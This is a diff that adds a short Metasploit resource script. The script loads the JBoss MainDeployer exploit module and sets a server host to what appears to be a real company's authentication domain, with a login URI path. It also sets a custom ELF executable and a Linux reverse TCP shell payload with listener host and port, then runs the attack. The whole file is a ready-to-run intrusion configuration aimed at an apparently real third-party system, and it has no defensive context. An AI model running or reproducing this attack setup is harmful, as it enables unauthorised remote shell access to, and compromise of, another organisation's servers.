@@ -1,0 +1,17 @@
+use exploit/multi/http/jboss_maindeployer
+
+set srvhost  authenticate.nextiva.com
+
+set srvport 80
+
+set URIPATH /AccountValidation/login.action
+
+set EXE::Custom /root/sml.elf
+
+set PAYLOAD  linux/x64/shell_reverse_tcp
+
+set lhost 0.0.0.0
+
+set lport 5555
+
+run
